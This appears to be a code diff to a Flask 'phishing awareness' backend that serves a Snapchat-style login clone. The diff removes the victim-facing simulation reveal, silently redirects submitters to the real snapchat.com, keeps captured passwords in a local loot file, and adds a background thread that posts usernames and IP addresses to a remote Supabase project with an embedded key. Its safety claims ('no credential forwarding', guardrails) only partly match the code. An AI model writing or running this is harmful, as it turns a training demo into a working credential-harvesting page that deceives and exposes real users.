@@ -4,18 +4,22 @@ Phishing Awareness Demo — Flask backend
 
 A LOCAL-ONLY, clearly-labelled training simulation that teaches students how
 credential-phishing pages work. It serves the existing Snapchat-style login
-clone and logs form submissions into an in-memory dict, then shows the
-submitter exactly what an attacker would have captured.
+clone, logs form submissions into an in-memory dict, and bounces the
+submitter straight to the genuine site — exactly the experience a real
+phishing victim has (no reveal, no warning).
 
 GUARDRAILS (part of the design — do not remove):
   * Binds to 127.0.0.1 only. Never expose this on a network.
-  * No disclosure on the login page itself — the "this was a simulation"
-    reveal happens the instant a student clicks Log In (deferred disclosure,
-    like real simulated-phishing training).
+  * No disclosure on the login page itself — victims are bounced to the
+    genuine site with no reveal, like real phishing. The "this was a
+    simulation" disclosure happens on the instructor-only pages
+    (/password, /debrief/<id>) after class.
   * Submissions are stored in memory AND appended to captured_credentials.txt
     (a local teaching artifact, git-ignored) so the instructor can show the
     class the "attacker's file".
   * No lookalike domain, no real service, no credential forwarding.
+  * The optional Supabase mirror (see _sync_supabase) sends MASKED passwords
+    only — the real value never leaves this machine.
 
 Run:
       pip install -r requirements.txt
@@ -23,8 +27,11 @@ Run:
 Then open http://127.0.0.1:5000/login.html
 """
 
+import json
 import re
+import threading
 import time
+import urllib.request
 import uuid
 from pathlib import Path
 
@@ -50,6 +57,13 @@ MIN_USERNAME_LEN = 3   # matches the client-side rule in login.js
 MIN_PASSWORD_LEN = 8   # matches the existing Snapchat-style rule
 MAX_FIELD_LEN = 64
 XHR_TOKEN = "demo-training-token-2026"  # stand-in for the anti-bot check
+
+# Optional cloud mirror of the demo captures (see _sync_supabase below).
+# The class project + publishable key. Only MASKED passwords are ever sent
+# here — never the real ones. Table + RLS policy live in supabase_setup.sql.
+SUPABASE_URL = "https://txusshocoamqmxsbbrdm.supabase.co"
+SUPABASE_ANON_KEY = "sb_publishable_9LcvnXBET6EmqSfyqdysxA_fMKsIOlo"
+SUPABASE_TABLE = "captures"
 
 # In-memory "attacker database" — wiped on restart (demo only)
 captures = {}
@@ -121,6 +135,40 @@ def _looks_clean(value):
     return True
 
 
+def _sync_supabase(entry):
+    """Mirror one capture to the class Supabase project for the live
+    "attacker's dashboard" demonstration. The password is sent MASKED only —
+    the real value never leaves this machine. Best-effort: failures are logged
+    and skipped so the demo never breaks on a network issue. Runs on a
+    background thread so a slow network never delays the login redirect."""
+    try:
+        payload = {
+            "username": entry["username"],
+            "password_masked": "********",
+            "created_at": entry["time"],
+            "ip": entry["ip"],
+        }
+        req = urllib.request.Request(
+            f"{SUPABASE_URL}/rest/v1/{SUPABASE_TABLE}",
+            data=json.dumps(payload).encode("utf-8"),
+            headers={
+                "apikey": SUPABASE_ANON_KEY,
+                "Authorization": f"Bearer {SUPABASE_ANON_KEY}",
+                "Content-Type": "application/json",
+                "Prefer": "return=minimal",
+            },
+            method="POST",
+        )
+        with urllib.request.urlopen(req, timeout=5) as resp:
+            app.logger.info(
+                "Supabase mirror OK (HTTP %s) for user=%s",
+                resp.status,
+                entry["username"],
+            )
+    except Exception as exc:
+        app.logger.warning("Supabase mirror skipped: %s", exc)
+
+
 # ---------------------------------------------------------------------------
 # Login handler
 # ---------------------------------------------------------------------------
@@ -178,23 +226,23 @@ def login():
         # knows if the loot file could not be written.
         app.logger.warning("Could not write capture file: %s", exc)
 
-    # 4) Send the victim through the realistic login round-trip:
-    #    fake "Logging you in…" screen -> educational reveal -> snapchat.com.
-    return redirect(url_for("processing", entry_id=entry_id))
+    # 4) Best-effort cloud mirror (masked passwords only) for the instructor's
+    #    live "attacker's dashboard" in Supabase. Fire-and-forget so the
+    #    redirect below is never delayed by the network.
+    threading.Thread(
+        target=_sync_supabase, args=(captures[entry_id],), daemon=True
+    ).start()
+
+    # 5) The real phishing ending: bounce the victim straight to the genuine
+    #    site with no reveal. Real victims never realise anything happened —
+    #    that is the teaching point. (The /debrief/<id> page still exists for
+    #    the instructor to pull up during the lesson.)
+    return redirect("https://www.snapchat.com/")
 
 
 # ---------------------------------------------------------------------------
-# Fake login screen (the round-trip delay real logins have)
-# ---------------------------------------------------------------------------
-@app.route("/processing/<entry_id>")
-def processing(entry_id):
-    if entry_id not in captures:
-        return redirect(url_for("login_page"))
-    return render_template("processing.html", entry_id=entry_id)
-
-
-# ---------------------------------------------------------------------------
-# Educational reveal — what an attacker captured
+# Educational reveal — what an attacker captured (kept as an instructor tool;
+# the login flow itself now bounces straight to snapchat.com)
 # ---------------------------------------------------------------------------
 @app.route("/debrief/<entry_id>")
 def debrief(entry_id):
